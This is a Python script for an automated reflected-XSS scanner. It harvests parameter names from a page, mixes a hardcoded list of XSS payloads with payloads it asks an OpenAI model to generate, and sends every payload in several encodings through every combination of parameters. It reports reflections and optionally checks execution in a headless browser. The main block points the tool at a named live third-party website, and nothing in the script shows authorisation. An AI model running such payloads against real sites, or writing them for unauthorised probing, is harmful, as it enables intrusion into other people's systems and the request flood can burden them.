from dotenv import load_dotenv

load_dotenv()

import itertools
import os
import re
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import requests
from bs4 import BeautifulSoup
from openai import OpenAI

# Optional: Headless browser integration with playwright
# pip install playwright
# playwright install
try:
    from playwright.sync_api import sync_playwright

    HEADLESS_AVAILABLE = True
except ImportError:
    HEADLESS_AVAILABLE = False


client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))

# A known baseline list of common XSS payloads (subset of known payloads)
KNOWN_PAYLOADS = [
    "<script>alert(1)</script>",
    '";alert(1);//',
    "<img src=x onerror=alert(1)>",
    "<svg><script>alert(1)</script>",
    "'><script>alert(document.domain)</script>",
    "</script><script>alert('XSS')</script>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
]


def generate_llm_xss_payloads(
    llm_model="gpt-4o-mini", html_content="", num_payloads=50
):
    """
    Generates additional XSS payloads using an LLM, incorporating HTML content.
    """
    prompt = f"""
        Given the following HTML content of a webpage:
        
        ```html
        {html_content}
        ```
        
        Generate {num_payloads} unique XSS (Cross-Site Scripting) payloads that 
        could potentially exploit reflected XSS vulnerabilities on this page.
        Consider different input types, attributes, event handlers, and encodings.
        Only provide the payloads, one per line, no extra commentary.
    """
    try:
        response = client.chat.completions.create(
            model=llm_model, messages=[{"role": "user", "content": prompt}]
        )
        lines = response.choices[0].message.content.strip().split("\n")
        # Strip surrounding whitespace from each payload
        lines = [l.strip() for l in lines if l.strip()]
        return lines
    except Exception as e:
        print(f"Error with LLM generation: {e}")
        return []


def encode_payloads(payload):
    """
    Return multiple encoded versions of the payload to try different bypass techniques.
    """
    # Basic HTML entity encoding (only a few chars)
    html_encoded = (
        payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    )

    # URL-encoded payload
    url_encoded = requests.utils.quote(payload)

    return [payload, html_encoded, url_encoded]


def extract_parameters_from_forms(html_content):
    """
    Extract potential parameter names from forms and other HTML elements on the page.
    """
    soup = BeautifulSoup(html_content, "html.parser")
    params = set()

    # Extract inputs from form elements
    for form in soup.find_all("form"):
        # Inputs: input, select, textarea, button
        for tag in form.find_all(["input", "select", "textarea", "button"]):
            name = tag.get("name")
            if name:
                params.add(name)
            # Also consider 'id' as potential parameter name
            id_attr = tag.get("id")
            if id_attr:
                params.add(id_attr)
            # Data attributes that might be used as parameters
            for attr in tag.attrs:
                if attr.startswith("data-"):
                    params.add(attr)

    # Extract query parameters from action attributes in forms
    for form in soup.find_all("form"):
        action = form.get("action")
        if action:
            parsed_url = urlparse(action)
            query_params = parse_qs(parsed_url.query)
            for param in query_params:
                params.add(param)

    # Extract parameters from URL in script tags
    for script in soup.find_all("script"):
        if script.string:
            # Simple regex to find query parameters in URLs within JavaScript
            matches = re.findall(r'\?([^#\'"]+)', script.string)
            for match in matches:
                pairs = match.split("&")
                for pair in pairs:
                    if "=" in pair:
                        key, _ = pair.split("=", 1)
                        params.add(key)

    # Extract parameters from links (e.g., href attributes)
    for link in soup.find_all("a", href=True):
        href = link["href"]
        parsed_url = urlparse(href)
        query_params = parse_qs(parsed_url.query)
        for param in query_params:
            params.add(param)

    # Include common parameter names as heuristic
    common_params = [
        "id",
        "user",
        "uid",
        "token",
        "auth",
        "action",
        "type",
        "name",
        "page",
        "lang",
        "redirect",
        "callback",
    ]
    params.update(common_params)

    # Fallback to a default param if nothing found
    if not params:
        params = {"test"}

    return list(params)


def check_security_headers(response):
    """
    Print and analyze security-related headers.
    """
    headers = response.headers
    csp = headers.get("Content-Security-Policy", None)
    x_xss = headers.get("X-XSS-Protection", None)
    strict_transport = headers.get("Strict-Transport-Security", None)

    print("[*] Security Headers:")
    if csp:
        print(f"    - CSP detected: {csp}")
    else:
        print("    - No CSP detected.")

    if x_xss:
        print(f"    - X-XSS-Protection: {x_xss}")
    else:
        print("    - No X-XSS-Protection header.")

    if strict_transport:
        print(f"    - Strict-Transport-Security: {strict_transport}")


def is_payload_reflected(html, payload):
    """
    Check if payload or its encoded forms appear in the response.
    More sophisticated checks might analyze DOM structure. Here we do simple substring checks.
    """
    # Check raw payload
    if payload in html:
        return True

    # Check some common encodings (if not found in raw form)
    # HTML encoded checks
    html_encoded = (
        payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    )
    if html_encoded in html:
        return True

    return False


def try_payload_in_browser(url):
    """
    OPTIONAL: Use a headless browser to detect if an alert is triggered or
    console logs appear. This is a simplistic check: we look for evidence that
    our payload executed. For real tests, you'd need a custom JS instrumentation.
    """
    if not HEADLESS_AVAILABLE:
        return False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        # Listen to console events
        console_logs = []
        page.on("console", lambda msg: console_logs.append(msg.text))

        try:
            page.goto(url, timeout=10000)
            # Check for known marker (like alert calls)
            # This isn't perfect: we can't catch native alerts easily without a dialog handler.
            # Instead, we rely on payloads that cause console.log or some other detectable side-effect.
            # Another option is to replace alert function on runtime and check if it's called:
            # page.evaluate("window.alert = (msg) => console.log('ALERT:'+msg);")
            # But since we can't ensure script execution order, this might not always work.

            # We give a second for scripts to run.
            page.wait_for_timeout(2000)
        except:
            pass
        finally:
            browser.close()

        # Check console logs for something that indicates execution (like "ALERT:")
        if any("ALERT:" in log for log in console_logs):
            return True
    return False


def test_xss(target_url, parameters, payloads, use_browser=False):
    """
    Try each payload in each parameter and check for reflected XSS.
    If 'use_browser' is True, also try a headless browser check.
    """
    vulnerable_params = {}
    parsed_url = urlparse(target_url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    path = parsed_url.path or "/"

    for param_combo_length in range(1, len(parameters) + 1):
        # Test single and multi-parameter combinations
        for param_subset in itertools.combinations(parameters, param_combo_length):
            for payload in payloads:
                # Try multiple encodings
                for epayload in encode_payloads(payload):
                    test_params = {
                        p: (epayload if p in param_subset else "normal")
                        for p in parameters
                    }

                    # Construct URL
                    full_url = urljoin(base_url, path) + "?" + urlencode(test_params)
                    try:
                        response = requests.get(full_url, timeout=10)
                        html = response.text
                        if response.status_code == 200:
                            # Check if reflected
                            if is_payload_reflected(html, epayload):
                                # Optional browser check to confirm execution
                                executed = False
                                if use_browser:
                                    executed = try_payload_in_browser(full_url)

                                if param_subset not in vulnerable_params:
                                    vulnerable_params[param_subset] = []
                                vulnerable_params[param_subset].append(
                                    (payload, epayload, executed)
                                )

                                print(
                                    f"[+] Potential XSS in {param_subset} with payload {payload} (encoded: {epayload}). Executed: {executed}"
                                )
                            else:
                                print(
                                    f"[-] No reflection for payload in {param_subset} with {payload}"
                                )
                        else:
                            print(
                                f"[-] {full_url} returned {response.status_code}, skipping."
                            )
                    except requests.RequestException as e:
                        print(f"[-] Request error for {full_url}: {e}")

    return vulnerable_params


if __name__ == "__main__":
    target_url = "https://www.playwsop.com"
    try:
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()
        html_content = response.text
    except requests.RequestException as e:
        print(f"Failed to get page {target_url}: {e}")
        exit()

    check_security_headers(response)
    discovered_params = extract_parameters_from_forms(html_content)

    # Combine known payloads with LLM generated payloads
    llm_payloads = generate_llm_xss_payloads(html_content=html_content, num_payloads=50)
    all_payloads = list(set(KNOWN_PAYLOADS + llm_payloads))

    # Test for XSS (no browser by default, turn on if you have playwright installed)
    vulnerabilities = test_xss(
        target_url, discovered_params, all_payloads, use_browser=False
    )

    if vulnerabilities:
        print("\n[!] Potential XSS Vulnerabilities Found:")
        for param_combo, payload_info_list in vulnerabilities.items():
            print(f"  - Parameter combination: {param_combo}")
            for original_payload, encoded_payload, executed in payload_info_list:
                print(
                    f"    - Payload: {original_payload} (Encoded tried: {encoded_payload}, Executed: {executed})"
                )
    else:
        print("\n[-] No XSS vulnerabilities detected with generated payloads.")
